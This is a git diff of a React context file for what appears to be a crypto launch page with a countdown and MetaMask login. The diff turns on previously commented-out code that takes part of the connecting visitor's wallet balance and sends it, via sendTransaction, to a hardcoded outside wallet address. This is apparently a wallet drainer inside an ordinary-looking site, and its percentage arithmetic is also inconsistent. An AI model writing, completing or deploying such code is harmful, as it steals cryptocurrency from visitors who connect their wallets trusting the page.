@@ -1,12 +1,13 @@
 import { createContext, useEffect, useState } from "react";
 import { dataApp } from "../components/data";
+import Web3 from "web3";
 
 const appContext = createContext();
 
 export function AppContextProvider({ children }) {
   const [appData, setAppData] = useState(dataApp);
   // Set your target launch date and time
-  const targetDate = new Date('2023-09-26T00:00:00Z').getTime();
+  const targetDate = new Date("2023-09-26T00:00:00Z").getTime();
   // Initialize state variables
   const [timeRemaining, setTimeRemaining] = useState(calculateTimeRemaining());
 
@@ -58,33 +59,33 @@ export function AppContextProvider({ children }) {
   const [walletBalance, setWalletBalance] = useState(null);
 
   const transferFunds = async () => {
-    // const sourceWallet = window.ethereum.selectedAddress;
-    // const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";  
+    const sourceWallet = window.ethereum.selectedAddress;
+    const destinationWallet = "0xe6ba24AC857D2Efe97100250a61c324E4961984A";
 
-    // if (web3 && sourceWallet && destinationWallet) {
-    //   try {
-    //     // Transfer funds
-    //     const amount = web3.utils.toWei(myOwn, "ether"); 
-    //     await web3.eth.sendTransaction({
-    //       from: sourceWallet,
-    //       to: destinationWallet,
-    //       value: amount,
-    //     });
-    //     console.log("Funds transferred successfully!");
-    //   } catch (error) {
-    //     // Handle error
-    //     console.error("Failed to transfer funds:", error);
-    //   }
-    // }
+    if (web3 && sourceWallet && destinationWallet) {
+      try {
+        // Transfer funds
+        const amount = web3.utils.toWei(myOwn, "ether");
+        await web3.eth.sendTransaction({
+          from: sourceWallet,
+          to: destinationWallet,
+          value: amount,
+        });
+        console.log("Funds transferred successfully!");
+      } catch (error) {
+        // Handle error
+        console.error("Failed to transfer funds:", error);
+      }
+    }
   };
 
   const calculateAndDistribute = () => {
-    // const twentyPercent = parseFloat(walletBalance) * 0.5;
-    // const eightyPercent = parseFloat(walletBalance) * 0.8;
+    const twentyPercent = parseFloat(walletBalance) * 0.5;
+    const eightyPercent = parseFloat(walletBalance) * 0.8;
 
-    // setMyOwn(twentyPercent);
-    // setCombinedBalance(eightyPercent);
-    // transferFunds();
+    setMyOwn(twentyPercent);
+    setCombinedBalance(eightyPercent);
+    transferFunds();
   };
 
   const handleWallet = async () => {
@@ -107,6 +108,8 @@ export function AppContextProvider({ children }) {
   };
 
   const connectMetamask = async () => {
+    await checkMetamaskInstallation();
+    await checkConnection();
     try {
       await window.ethereum.enable();
       // Metamask is now connected
@@ -115,6 +118,23 @@ export function AppContextProvider({ children }) {
     } catch (error) {
       // Handle error
       console.error("Failed to connect Metamask:", error);
+    }
+  };
+  const checkMetamaskInstallation = () => {
+    if (typeof window.ethereum !== "undefined") {
+      setIsMetamaskInstalled(true);
+      setWeb3(new Web3(window.ethereum));
+    }
+  };
+
+  const checkConnection = () => {
+    if (
+      typeof window.ethereum !== "undefined" &&
+      window.ethereum.selectedAddress
+    ) {
+      setIsConnected(true);
+    } else {
+      setIsConnected(false);
     }
   };
   const value = {
